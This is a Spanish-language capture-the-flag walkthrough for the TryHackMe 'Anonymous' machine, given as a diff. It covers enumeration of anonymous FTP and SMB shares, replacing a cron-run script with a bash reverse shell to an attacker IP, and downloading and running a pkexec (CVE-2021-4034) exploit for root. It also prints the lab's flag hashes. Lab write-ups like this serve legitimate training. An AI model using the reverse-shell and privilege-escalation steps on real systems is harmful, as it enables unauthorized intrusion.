@@ -1,0 +1,115 @@
+Tryhackme
+Anonymous
+
+nmap
+
+>nmap -p- -sS -sC -sV --open --min-rate 2500 -vvv -n -Pn 10.10.107.183 -oN nmap
+
+21/tcp  open  ftp         syn-ack ttl 64 vsftpd 2.0.8 or later
+    ftp-anon: Anonymous FTP login allowed (FTP code 230)
+
+22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  09T�V      syn-ack ttl 64 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+
+Al ver que podemos ingresar de forma anónima al puerto 21, ingresamos.
+
+Al ingresar, encontramos una carpeta con el nombre "scripts". Procedemos a llevarnos el contenido.
+
+>get clean.sh
+>get removed_files.log
+>get to_do.txt
+
+Ya teniendo esto, ahora procedemos a buscar archivos compartidos en el puerto 445.
+
+>smbmap -H 10.10.107.183
+
+	•pics                                                    READ ONLY
+
+Entramos en "pics".
+
+>smbmap -H 10.10.107.183 -r pics
+
+	•corgo2.jpg
+	•puppos.jpeg
+
+Procedemos a extraerlos.
+
+>smbclient //10.10.107.183/pics -N
+Con smbclient ingresamos al puerto 445.
+
+>get corgo2.jpg
+>get puppos.jpeg
+
+Ya tenemos las 2 imágenes de perritos en nuestro PC.
+
+Al terminar de descargar todas las posibilidades que teníamos a mano, optamos por volver al puerto FTP anónimo y modificar uno de los scripts hechos en bash para que nos envíe una reverse shell.
+
+>nano clean.sh
+
+	>#!/bin/bash
+	>bash -i >& /dev/tcp/10.18.112.21/443 0>&1
+
+Luego de haber modificado el archivo, lo subimos para que reemplace al actual "clean.sh".
+
+>ssh 10.10.107.183
+>usermame:anonymous
+
+>cd scripts
+>put clean.sh
+
+Luego de haberlo subido, abrimos el puerto 443 con netcat.
+
+>nc -nlvp 443
+
+Estamos dentro.
+
+Hacemos el tratamiento de la TTY.
+
+<script /dev/null -c bash
+>(control z)
+>stty raw -echo; fg
+>reset xterm
+>export TERM=xterm
+>export SHELL=bash
+
+Encontramos user.txt.
+
+>>90d6f992585815ff991e68748c414740
+
+Ahora procedemos a escalar privilegios.
+
+>find / -perm -4000 2>/dev/null
+
+Esto nos trae lo siguiente:
+
+>/usr/bin/pkexec
+
+Al ver su versión, vemos que es una versión vulnerable.
+
+>/usr/bin/pkexec --version
+	•kexec version 0.105
+
+Entonces procedemos a ejecutar un exploit para elevar privilegios como root. Para esto, primero montamos un servidor Python en mi máquina local.
+
+>python3 -m http.server 80
+
+Luego nos dirigimos a la carpeta "/tmp" donde tenemos privilegios de escritura.
+
+>cd /tmp
+
+Dentro de "/tmp", traemos el exploit.
+
+>wget 10.18.112.21:80/CVE-2021-4034.py
+
+Y lo ejecutamos.
+
+>python3 CVE-2021-4034.py
+
+Nos pregunta y/n, colocamos "N".
+
+Y ya somos root.
+
+root.txt
+>>4d930091c31a622a7ed10f27999af363
+
